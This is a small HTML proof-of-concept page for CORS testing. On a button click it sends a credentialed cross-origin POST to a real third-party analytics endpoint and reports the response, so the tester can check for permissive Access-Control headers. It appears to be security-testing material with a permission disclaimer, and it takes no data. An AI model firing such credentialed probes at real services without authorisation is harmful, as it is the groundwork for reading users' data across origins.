<!doctype html>
<html>
<head>
  <meta charset="utf-8"/>
  <title>CORS PoC</title>
</head>
<body>
  <h2>CORS PoC - Test Only</h2>
  <p>Only run against systems you own or have permission to test.</p>
  <button id="run">Run PoC</button>
  <pre id="out"></pre>

<script>
document.getElementById('run').addEventListener('click', function() {
  const out = (msg) => { document.getElementById('out').textContent += msg + "\n"; };

  var xhr = new XMLHttpRequest();
  xhr.open("POST", "https://b.clarity.ms/collect", true);
  xhr.withCredentials = true;
  xhr.setRequestHeader("Content-Type", "text/plain");

  xhr.onload = function () {
    out("Status: " + xhr.status + " " + xhr.statusText);
    try {
      // Some servers return empty body; show raw responseText anyway
      out("Response length: " + xhr.responseText.length);
    } catch (e) {
      out("Could not read response body: " + e);
    }
    // We cannot read response headers like ACAO from JS directly unless the server exposes them via Access-Control-Expose-Headers.
    out("Check Network tab for response headers (Access-Control-Allow-Origin / Access-Control-Allow-Credentials).");
  };

  xhr.onerror = function () {
    out("Network error or blocked by CORS.");
  };

  // Minimal payload â€” server may return 400 if it expects a specific binary format; that's OK for testing header reflection.
  xhr.send("poc-test");
});
</script>
</body>
</html>
